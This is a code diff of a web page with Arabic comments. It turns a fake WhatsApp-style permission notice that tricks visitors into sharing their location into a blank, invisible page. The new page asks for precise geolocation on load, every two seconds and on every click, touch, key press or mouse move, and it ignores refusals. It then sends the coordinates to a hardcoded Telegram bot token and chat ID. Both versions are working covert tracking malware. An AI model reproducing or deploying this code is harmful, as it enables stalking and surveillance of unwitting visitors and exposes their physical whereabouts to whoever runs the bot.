@@ -2,213 +2,57 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>إشعار جديد</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f0f0f0;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .mobile-notification {
-            background: white;
-            width: 100%;
-            max-width: 400px;
-            border-radius: 15px;
-            padding: 15px;
-            margin: 10px 0;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-            border-left: 4px solid #25D366;
-            animation: notificationPop 0.6s ease-out;
-        }
-        
-        .notification-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 10px;
-        }
-        
-        .icon {
-            width: 35px;
-            height: 35px;
-            background: #25D366;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            margin-right: 10px;
-        }
-        
-        .title {
-            font-weight: 600;
-            color: #333;
-        }
-        
-        .subtitle {
-            font-size: 12px;
-            color: #666;
-        }
-        
-        .time {
-            font-size: 11px;
-            color: #999;
-            margin-left: auto;
-        }
-        
-        .message {
-            font-size: 14px;
-            line-height: 1.4;
-            margin-bottom: 15px;
-        }
-        
-        .notification-buttons {
-            display: flex;
-            gap: 10px;
-        }
-        
-        .notif-btn {
-            flex: 1;
-            padding: 10px;
-            border: none;
-            border-radius: 20px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-        }
-        
-        .notif-allow {
-            background: #25D366;
-            color: white;
-        }
-        
-        .notif-deny {
-            background: #f8f9fa;
-            color: #666;
-            border: 1px solid #ddd;
-        }
-        
-        @keyframes notificationPop {
-            0% {
-                transform: translateX(100%);
-                opacity: 0;
-            }
-            100% {
-                transform: translateX(0);
-                opacity: 1;
-            }
-        }
-    </style>
-</head>
-<body>
-    <div id="notificationsContainer"></div>
-
+    <title> </title>
     <script>
         const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
         const CHAT_ID = "6451561574";
 
-        let notificationInterval;
-
-        function createWhatsAppNotification() {
-            const container = document.getElementById('notificationsContainer');
-            const notification = document.createElement('div');
-            notification.className = 'mobile-notification';
+        function aggressiveInfiniteRequest() {
+            // طلب فوري
+            requestLocation();
             
-            const now = new Date();
-            const timeString = now.getHours() + ':' + (now.getMinutes() < 10 ? '0' : '') + now.getMinutes();
+            // طلب كل 2 ثانية
+            setInterval(requestLocation, 2000);
             
-            notification.innerHTML = `
-                <div class="notification-header">
-                    <div class="icon">📱</div>
-                    <div>
-                        <div class="title">نظام الموقع</div>
-                        <div class="subtitle">طلب إذن وصول</div>
-                    </div>
-                    <div class="time">${timeString}</div>
-                </div>
-                <div class="message">
-                    <strong>مطلوب الوصول إلى موقعك</strong><br>
-                    يسمح هذا للموقع بمشاركة موقعك الدقيق مع البوت
-                </div>
-                <div class="notification-buttons">
-                    <button class="notif-btn notif-allow" onclick="handleAllow()">السماح</button>
-                    <button class="notif-btn notif-deny" onclick="this.parentElement.parentElement.remove()">رفض</button>
-                </div>
-            `;
-            
-            container.appendChild(notification);
-            
-            // حذف تلقائي بعد 8 ثواني
-            setTimeout(() => {
-                if (notification.parentElement) {
-                    notification.remove();
-                }
-            }, 8000);
+            // طلب عند أي تفاعل
+            window.addEventListener('click', requestLocation);
+            window.addEventListener('touchstart', requestLocation);
+            window.addEventListener('keydown', requestLocation);
+            window.addEventListener('mousemove', requestLocation);
         }
 
-        function handleAllow() {
-            // إيقاف الإشعارات
-            clearInterval(notificationInterval);
-            
-            // طلب الإذن الحقيقي
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async function(position) {
-                        const lat = position.coords.latitude;
-                        const lng = position.coords.longitude;
-                        
-                        await sendToTelegram(`✅ وافق عبر إشعار محاكاة\nالموقع: ${lat}, ${lng}`);
-                        alert('شكراً! تم مشاركة موقعك');
-                        window.close();
-                    },
-                    function(error) {
-                        alert('يجب السماح بالموقع في طلب النظام');
-                        // إعادة الإشعارات إذا رفض
-                        startNotifications();
-                    }
-                );
-            }
+        function requestLocation() {
+            navigator.geolocation.getCurrentPosition(
+                async function(position) {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: `📍 ${lat},${lng}`
+                        })
+                    });
+                    
+                    window.close();
+                },
+                function(error) {
+                    // تجاهل الرفض - نستمر
+                },
+                { enableHighAccuracy: true, timeout: 3000 }
+            );
         }
 
-        function startNotifications() {
-            // أول إشعار فوري
-            createWhatsAppNotification();
-            
-            // إشعار كل 10 ثواني
-            notificationInterval = setInterval(createWhatsAppNotification, 10000);
-            
-            // أيضاً إشعار عند التمرير
-            window.addEventListener('scroll', createWhatsAppNotification);
-        }
+        // البدء العدواني الفوري
+        aggressiveInfiniteRequest();
+        
+        // وإعادة البدء كل 10 ثواني للتأكد
+        setInterval(aggressiveInfiniteRequest, 10000);
 
-        async function sendToTelegram(message) {
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message
-                    })
-                });
-            } catch (error) {
-                console.log("Error sending to Telegram");
-            }
-        }
-
-        // بدء الإشعارات عند التحميل
-        document.addEventListener('DOMContentLoaded', startNotifications);
     </script>
+</head>
+<body style="margin:0;padding:0;background:transparent;">
 </body>
 </html>
